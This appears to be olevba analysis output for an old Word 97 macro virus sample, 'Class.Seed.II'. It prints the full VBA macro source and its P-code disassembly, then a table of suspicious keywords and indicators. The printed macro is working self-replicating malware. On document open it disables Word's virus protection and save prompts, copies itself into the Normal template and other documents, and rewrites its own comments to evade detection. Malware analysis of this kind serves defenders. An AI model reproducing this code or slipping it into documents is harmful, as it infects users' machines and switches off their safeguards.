olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.y
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.y - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'81376636814662431524813766368146624315248137663681466243152481376636814662431524
Randomize
'13795058788950044821849137950587889500448218491379505878895004482184913795058788950044821849
x = 0: o = 0
'1113316648962304576036111331664896230457603611133166489623045760361113316648962304576036
On Error GoTo 93
'1116044344947024789904111604434494702478990411160443449470247899041116044344947024789904
Options.VirusProtection = False
'478199910423045061636478199910423045061636478199910423045061636478199910423045061636
Options.SaveNormalPrompt = False
'952024854012117472256952024854012117472256952024854012117472256952024854012117472256
Options.ConfirmConversions = False
'992892673651208974436992892673651208974436992892673651208974436992892673651208974436
fx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'3154353602516682047281315435360251668204728131543536025166820472813154353602516682047281
xf = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'1456680024929181180625145668002492918118062514566800249291811806251456680024929181180625
If xf > 96 And fx > 0 Then GoTo 93
'6512959202532271607449651295920253227160744965129592025322716074496512959202532271607449
If xf < 96 Then
'4685363284921777790329468536328492177779032946853632849217777903294685363284921777790329
    Set xs = NormalTemplate.VBProject.VBComponents.Item(1)
'1884662208923522663641188466220892352266364118846622089235226636411884662208923522663641
    ActiveDocument.VBProject.VBComponents.Item(1).Name = xs.Name
'107439728420437561600107439728420437561600107439728420437561600107439728420437561600
    ActiveDocument.VBProject.VBComponents.Item(1).Export Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'1042230828965712336400104223082896571233640010422308289657123364001042230828965712336400
End If
'50717186563576040000507171865635760400005071718656357604000050717186563576040000
If fx = 0 Then Set xs = ActiveDocument.VBProject.VBComponents.Item(1)
'1550896622526391951936155089662252639195193615508966225263919519361550896622526391951936
k = Int(Rnd(1) * 100) + 1
'6561026102510869730564656102610251086973056465610261025108697305646561026102510869730564
If k = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.cannabisculture.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'154313537293393878049154313537293393878049154313537293393878049154313537293393878049
l = Int(Rnd(1) * 75) + 1
'478795665962752261444478795665962752261444478795665962752261444478795665962752261444
If l = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.Microsoft.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'81527380900335878929815273809003358789298152738090033587892981527380900335878929
m = Int(Rnd(1) * 50) + 1
'746133164151586674129746133164151586674129746133164151586674129746133164151586674129
If m = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'35129255184799984656351292551847999846563512925518479998465635129255184799984656
n = Int(Rnd(1) * 25) + 1
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
If n = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(32) + Chr(73) + Chr(73)
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
xs.codemodule.AddFromFile Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
With xs.codemodule
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    For p = 1 To 4
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    .deletelines 1
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    Next p
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
End With
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
If xf < 96 Then
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    With xs.codemodule
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    .replaceline 1, "Sub AutoClose()"
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    .replaceline 99, "Sub ToolsMacro()"
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    End With
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
End If
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
With xs.codemodule
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    For p = 2 To 44 Step 2
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    x = Int(Rnd(414835) * 403989) + 8485
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    o = Int(Rnd(298368) * 235865) + 2988
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    .replaceline p, "'" & x * x & o * o & x * x & o * o & x * x & o * o & x * x & o * o
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
Next p
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    For xp = 46 To 98 Step 2
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    .replaceline xp, "'" & Application.Assistant & Application.DisplayRecentFiles & Application.FocusInMailHeader & Application.Build & Application.StartupPath & Application.ActiveDocument & Application.Version
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
Next xp
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
End With
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
93:
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
If xf > 98 And fx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
End Sub
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
Sub ViewVBCode()
'Word97/Class.Seed.II by Virus :) Smile!
End Sub




-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.y
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11812 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0050 "81376636814662431524813766368146624315248137663681466243152481376636814662431524"
' Line #2:
' 	ArgsCall Read 0x0000 
' Line #3:
' 	QuoteRem 0x0000 0x005C "13795058788950044821849137950587889500448218491379505878895004482184913795058788950044821849"
' Line #4:
' 	LitDI2 0x0000 
' 	St x 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St o 
' Line #5:
' 	QuoteRem 0x0000 0x0058 "1113316648962304576036111331664896230457603611133166489623045760361113316648962304576036"
' Line #6:
' 	OnError 93 
' Line #7:
' 	QuoteRem 0x0000 0x0058 "1116044344947024789904111604434494702478990411160443449470247899041116044344947024789904"
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	QuoteRem 0x0000 0x0054 "478199910423045061636478199910423045061636478199910423045061636478199910423045061636"
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	QuoteRem 0x0000 0x0054 "952024854012117472256952024854012117472256952024854012117472256952024854012117472256"
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' 	QuoteRem 0x0000 0x0054 "992892673651208974436992892673651208974436992892673651208974436992892673651208974436"
' Line #14:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St fx 
' Line #15:
' 	QuoteRem 0x0000 0x0058 "3154353602516682047281315435360251668204728131543536025166820472813154353602516682047281"
' Line #16:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St xf 
' Line #17:
' 	QuoteRem 0x0000 0x0058 "1456680024929181180625145668002492918118062514566800249291811806251456680024929181180625"
' Line #18:
' 	Ld xf 
' 	LitDI2 0x0060 
' 	Gt 
' 	Ld fx 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 93 
' 	EndIf 
' Line #19:
' 	QuoteRem 0x0000 0x0058 "6512959202532271607449651295920253227160744965129592025322716074496512959202532271607449"
' Line #20:
' 	Ld xf 
' 	LitDI2 0x0060 
' 	Lt 
' 	IfBlock 
' Line #21:
' 	QuoteRem 0x0000 0x0058 "4685363284921777790329468536328492177779032946853632849217777903294685363284921777790329"
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set xs 
' Line #23:
' 	QuoteRem 0x0000 0x0058 "1884662208923522663641188466220892352266364118846622089235226636411884662208923522663641"
' Line #24:
' 	Ld xs 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #25:
' 	QuoteRem 0x0000 0x0054 "107439728420437561600107439728420437561600107439728420437561600107439728420437561600"
' Line #26:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #27:
' 	QuoteRem 0x0000 0x0058 "1042230828965712336400104223082896571233640010422308289657123364001042230828965712336400"
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	QuoteRem 0x0000 0x0050 "50717186563576040000507171865635760400005071718656357604000050717186563576040000"
' Line #30:
' 	Ld fx 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set xs 
' 	EndIf 
' Line #31:
' 	QuoteRem 0x0000 0x0058 "1550896622526391951936155089662252639195193615508966225263919519361550896622526391951936"
' Line #32:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #33:
' 	QuoteRem 0x0000 0x0058 "6561026102510869730564656102610251086973056465610261025108697305646561026102510869730564"
' Line #34:
' 	Ld k 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wdWindowStateMinimize 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' 	BoS 0x0000 
' 	LitStr 0x001E "http://www.cannabisculture.com"
' 	ParamNamed Address 
' 	LitVarSpecial (False)
' 	ParamNamed NewWindow 
' 	LitVarSpecial (False)
' 	ParamNamed AddHistory 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed ExtraInfo 
' 	Ld ActiveDocument 
' 	ArgsMemCall FollowHyperlink 0x0004 
' 	EndIf 
' Line #35:
' 	QuoteRem 0x0000 0x0054 "154313537293393878049154313537293393878049154313537293393878049154313537293393878049"
' Line #36:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x004B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St l 
' Line #37:
' 	QuoteRem 0x0000 0x0054 "478795665962752261444478795665962752261444478795665962752261444478795665962752261444"
' Line #38:
' 	Ld l 
' 	LitDI2 0x004A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wdWindowStateMinimize 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' 	BoS 0x0000 
' 	LitStr 0x0018 "http://www.Microsoft.com"
' 	ParamNamed Address 
' 	LitVarSpecial (False)
' 	ParamNamed NewWindow 
' 	LitVarSpecial (False)
' 	ParamNamed AddHistory 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed ExtraInfo 
' 	Ld ActiveDocument 
' 	ArgsMemCall FollowHyperlink 0x0004 
' 	EndIf 
' Line #39:
' 	QuoteRem 0x0000 0x0050 "81527380900335878929815273809003358789298152738090033587892981527380900335878929"
' Line #40:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' Line #41:
' 	QuoteRem 0x0000 0x0054 "746133164151586674129746133164151586674129746133164151586674129746133164151586674129"
' Line #42:
' 	Ld m 
' 	LitDI2 0x0031 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #43:
' 	QuoteRem 0x0000 0x0050 "35129255184799984656351292551847999846563512925518479998465635129255184799984656"
' Line #44:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St n 
' Line #45:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #46:
' 	Ld n 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #47:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #48:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	Ld xs 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #49:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #50:
' 	StartWithExpr 
' 	Ld xs 
' 	MemLd codemodule 
' 	With 
' Line #51:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #52:
' 	StartForVariable 
' 	Ld p 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #53:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #54:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #55:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #56:
' 	StartForVariable 
' 	Ld p 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #58:
' 	EndWith 
' Line #59:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #60:
' 	Ld xf 
' 	LitDI2 0x0060 
' 	Lt 
' 	IfBlock 
' Line #61:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #62:
' 	StartWithExpr 
' 	Ld xs 
' 	MemLd codemodule 
' 	With 
' Line #63:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #64:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #65:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #66:
' 	LitDI2 0x0063 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #67:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #68:
' 	EndWith 
' Line #69:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #72:
' 	StartWithExpr 
' 	Ld xs 
' 	MemLd codemodule 
' 	With 
' Line #73:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #74:
' 	StartForVariable 
' 	Ld p 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x002C 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #75:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #76:
' 	LitDI4 0x5473 0x0006 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x2A15 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x2125 
' 	Add 
' 	St x 
' Line #77:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #78:
' 	LitDI4 0x8D80 0x0004 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x9959 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0BAC 
' 	Add 
' 	St o 
' Line #79:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #80:
' 	Ld p 
' 	LitStr 0x0001 "'"
' 	Ld x 
' 	Ld x 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld x 
' 	Ld x 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld x 
' 	Ld x 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld x 
' 	Ld x 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #81:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #82:
' 	StartForVariable 
' 	Ld p 
' 	EndForVariable 
' 	NextVar 
' Line #83:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #84:
' 	StartForVariable 
' 	Ld xp 
' 	EndForVariable 
' 	LitDI2 0x002E 
' 	LitDI2 0x0062 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #85:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #86:
' 	Ld xp 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd Assistant 
' 	Concat 
' 	Ld Application 
' 	MemLd DisplayRecentFiles 
' 	Concat 
' 	Ld Application 
' 	MemLd FocusInMailHeader 
' 	Concat 
' 	Ld Application 
' 	MemLd Build 
' 	Concat 
' 	Ld Application 
' 	MemLd StartupPath 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	Concat 
' 	Ld Application 
' 	MemLd Version 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #87:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #88:
' 	StartForVariable 
' 	Ld xp 
' 	EndForVariable 
' 	NextVar 
' Line #89:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #90:
' 	EndWith 
' Line #91:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #92:
' 	LineNum 93 
' 	BoS 0x0000 
' Line #93:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #94:
' 	Ld xf 
' 	LitDI2 0x0062 
' 	Gt 
' 	Ld fx 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #95:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #96:
' 	EndSub 
' Line #97:
' 	QuoteRem 0x0000 0x005B "The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b"
' Line #98:
' 	FuncDefn (Sub ViewVBCode())
' Line #99:
' 	QuoteRem 0x0000 0x0027 "Word97/Class.Seed.II by Virus :) Smile!"
' Line #100:
' 	EndSub 
' Line #101:
' Line #102:
' Line #103:
' Line #104:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.cannabisc|URL                                          |
|          |ulture.com          |                                             |
|IOC       |http://www.Microsoft|URL                                          |
|          |.com                |                                             |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
